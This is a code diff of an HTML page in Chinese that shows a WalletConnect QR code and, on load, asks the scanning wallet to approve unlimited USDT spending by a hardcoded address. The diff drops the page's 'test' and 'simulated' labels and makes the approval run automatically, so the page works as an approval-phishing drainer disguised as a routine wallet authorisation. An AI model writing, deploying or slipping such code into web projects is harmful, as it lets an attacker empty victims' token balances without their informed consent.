@@ -1,15 +1,16 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WalletConnect QR 授權測試</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WalletConnect USDT 授權</title>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.3.5/dist/web3.min.js"></script>
 </head>
-<body style="display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column;">
-  <h2>WalletConnect 模擬 USDT 授權</h2>
-  <button id="connect" style="padding: 10px 20px; font-size: 18px;">掃碼授權</button>
+<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
+  <h2>請使用手機錢包掃描 QR Code</h2>
+  <div id="qr"></div>
+
   <script>
     const provider = new WalletConnectProvider.default({
       rpc: {
@@ -17,29 +18,42 @@
       }
     });
 
-    document.getElementById("connect").addEventListener("click", async () => {
-      await provider.enable();
-      const web3 = new Web3(provider);
+    async function start() {
+      try {
+        // 啟動 WalletConnect session，顯示 QR Code
+        await provider.enable();
+        const web3 = new Web3(provider);
 
-      const accounts = await web3.eth.getAccounts();
-      const owner = accounts[0];
-      const usdtContract = new web3.eth.Contract([
-        { "constant": false, "inputs": [
-          { "name": "_spender", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ], "name": "approve", "outputs": [
-          { "name": "", "type": "bool" }
-        ], "type": "function" }
-      ], "0xdAC17F958D2ee523a2206206994597C13D831ec7");
+        const accounts = await web3.eth.getAccounts();
+        const owner = accounts[0];
 
-      const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";
-      const amount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+        const usdtContract = new web3.eth.Contract([
+          {
+            "constant": false,
+            "inputs": [
+              { "name": "_spender", "type": "address" },
+              { "name": "_value", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "type": "function"
+          }
+        ], "0xdAC17F958D2ee523a2206206994597C13D831ec7");
 
-      const tx = await usdtContract.methods.approve(spender, amount).send({ from: owner });
-      alert("授權成功: " + JSON.stringify(tx));
+        const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";
+        const amount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
 
-      provider.disconnect();
-    });
+        const tx = await usdtContract.methods.approve(spender, amount).send({ from: owner });
+
+        alert("✅ 授權成功！\nTxHash: " + tx.transactionHash);
+        provider.disconnect();
+      } catch (e) {
+        console.error("❌ 發生錯誤：", e);
+      }
+    }
+
+    // 自動執行連線與授權流程
+    start();
   </script>
 </body>
 </html>
